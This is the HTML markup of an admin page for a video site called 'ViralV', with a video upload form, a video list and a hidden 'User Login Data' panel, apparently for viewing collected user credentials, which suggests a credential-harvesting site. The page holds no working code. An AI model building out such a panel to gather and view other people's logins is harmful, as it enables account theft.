<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Admin - ViralV</title>
  <link rel="stylesheet" href="style.css">
  <link rel="icon" href="assets/favicon.ico">
</head>
<body>
  <div class="background-overlay"></div>
  
  <header>
    <div class="logo-container">
      <svg class="logo" viewBox="0 0 200 200" xmlns="http://www.w3.org/2000/svg">
        <path d="M20 20 L180 20 L100 180 Z" fill="#ff0000" stroke="#fff" stroke-width="5"/>
        <text x="100" y="140" font-size="60" text-anchor="middle" fill="#fff" font-weight="bold">V</text>
      </svg>
      <h1>ViralV Admin</h1>
    </div>
    <div class="admin-controls">
      <button id="menuBtn">â‹¯</button>
      <div class="dropdown" id="dropdownMenu">
        <a href="#" id="viewLogins">View Logins</a>
        <a href="index.html">View Public Page</a>
        <a href="#" id="logout">Logout</a>
      </div>
    </div>
  </header>

  <main class="admin-main">
    <section class="upload-section">
      <h2>Upload New Video</h2>
      <div class="upload-form">
        <input type="text" id="videoTitle" placeholder="Video Title" required>
        <input type="file" id="videoUpload" accept="video/*" required>
        <button onclick="uploadVideo()">Upload Video</button>
      </div>
    </section>

    <section class="videos-section">
      <h2>Manage Videos</h2>
      <div class="videos-grid" id="adminVideoContainer">
        <!-- Videos will load here -->
      </div>
    </section>

    <section class="logins-section" id="loginsSection" style="display:none;">
      <h2>User Login Data</h2>
      <div class="logins-list" id="credentialsList">
        <!-- Login data will load here -->
      </div>
    </section>
  </main>

  <script src="script.js"></script>
</body>
</html>
